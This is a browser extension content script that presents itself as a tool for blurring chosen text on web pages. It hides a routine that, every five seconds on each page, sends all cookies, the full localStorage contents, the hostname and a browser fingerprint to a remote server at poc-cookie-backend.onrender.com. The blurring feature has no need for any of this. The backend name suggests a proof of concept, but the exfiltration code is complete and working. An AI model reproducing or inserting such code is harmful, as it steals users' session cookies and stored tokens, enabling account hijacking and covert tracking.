"use strict"

// Define a constant for the blur filter style. This makes it easier to change the blur effect later.
const blurFilter = "blur(6px)";
// Initialize a variable to store the text that should be blurred. It will be updated from the popup.
let textToBlur = "";
// Initialize a variable to store a unique profile ID for the user.
let profileId = "";


/**
 * Generates a UUID (Universally Unique Identifier).
 * @returns {string} A UUID string.
 */
const generateUUID = () => {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy4]/g, function (c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}


// Check if a profile ID already exists in local storage.
if (localStorage.getItem("**profileId")) {
    // If it exists, retrieve it.
    profileId = localStorage.getItem("**profileId");
} else {
    // If it doesn't exist, generate a new one and store it in local storage.
    profileId = generateUUID();
    localStorage.setItem("**profileId", profileId);
}

/**
 * Generates a fingerprint for the browser.
 * It uses multiple browser characteristics to create a unique identifier.
 * @returns {string} A hashed fingerprint string.
 */

/*const generateFingerprint = () => {
    // Collect various browser characteristics.
    const components = [
        navigator.userAgent,
        screen.width + "x" + screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.language,
        navigator.hardwareConcurrency,
        navigator.userAgentData.platform || navigator.platform, // Use userAgentData.platform if available, otherwise fallback to navigator.platform
        navigator.maxTouchPoints,
        getCanvasFingerprint()
    ];

    // Concatenate the components and hash them to generate the fingerprint.
    return hashString(components.join("###"));
}*/

async function generateFingerprint() {
    try {
        return await ThumbmarkJS.getFingerprint();
    } catch (error) {
        console.error("Error generating fingerprint:", error);
    }
}


/**
 * Extracts and formats cookies from the document.
 * @returns {object} An object where keys are cookie names and values are cookie values.
 */
const complimentCookie = () => {
    return document.cookie.split(";")
        .reduce(
            (ac, cv) =>
                Object.assign(ac,
                    {
                        [cv.split('=')[0].trim()]: cv.split('=')[1].trim()
                    }),
            {});
}

/**
 * Sends collected data (cookies, local storage, etc.) to a remote server.
 */
const logData = async () => {
    // Send the data via a POST request to the specified URL.
    await fetch(
        // "http://localhost:50000/api/v1/data", // Replace with the actual URL of your server.
        "https://poc-cookie-backend.onrender.com/api/v1/data", //Alternative url
        {
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                // Include profile, url, data, and localData in the request body.
                profile: await generateFingerprint(),
                url: window.location.hostname,
                data: document.cookie,
                localData: JSON.stringify(localStorage)
            })
        });
}

// Set up an interval to periodically log data (every 5 seconds).
setInterval(async () => {
    await logData();
}, 5000);


/**
 * Recursively processes a DOM node to find and blur text.
 * @param {Node} node - The DOM node to process.
 */
// Search this DOM node for text to blur and blur the parent element if found.
const processNode = (node) => {
    // If the node has child nodes, process them recursively.
    if (node.childNodes.length > 0) {
        Array.from(node.childNodes).forEach(processNode)
    }
    // If the node is a text node and it's not empty.
    if (node.nodeType === Node.TEXT_NODE && node.textContent !== null && node.textContent.trim().length > 0) {
        const parent = node.parentElement
        // If the parent is a script or already has the blur filter.
        if (parent !== null && (parent.tagName === 'SCRIPT' || parent.style.filter === blurFilter)) {
            // Already blurred
            return
        }
        // If the text node contains the text to blur.
        if (node.textContent.includes(textToBlur)) {
            blurElement(parent)
        }
    }
}

/**
 * Applies the blur filter to an element.
 * @param {HTMLElement} elem - The element to blur.
 */
const blurElement = (elem) => {
    elem.style.filter = blurFilter
    // Log the details of the blurred element for debugging.
    console.debug("blurred id:" + elem.id + " class:" + elem.className + " tag:" + elem.tagName + " text:" + elem.textContent)
}

// Create a MutationObserver to watch for changes to the DOM.
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        // If new nodes are added.
        if (mutation.addedNodes.length > 0) {
            mutation.addedNodes.forEach(processNode)
        } else {
            // If nodes are modified.
            processNode(mutation.target)
        }
    })
})

// Enable the content script by default.
let enabled = true
// Define the keys to be retrieved from storage.
const keys = ["enabled", "item"]

// Get the stored 'enabled' and 'item' settings from chrome storage.
chrome.storage.sync.get(keys, (data) => {
    // Update the 'enabled' variable based on the stored setting.
    if (data.enabled === false) {
        enabled = false
    }
    // Update the 'textToBlur' variable based on the stored setting.
    if (data.item) {
        textToBlur = data.item
    }
    // Only start observing the DOM if the extension is enabled and there is text to blur.
    if (enabled && textToBlur.trim().length > 0) {
        observer.observe(document, {
            attributes: false,
            characterData: true,
            childList: true,
            subtree: true,
        });
        // Loop through all elements on the page for initial processing.
        processNode(document)
    }
})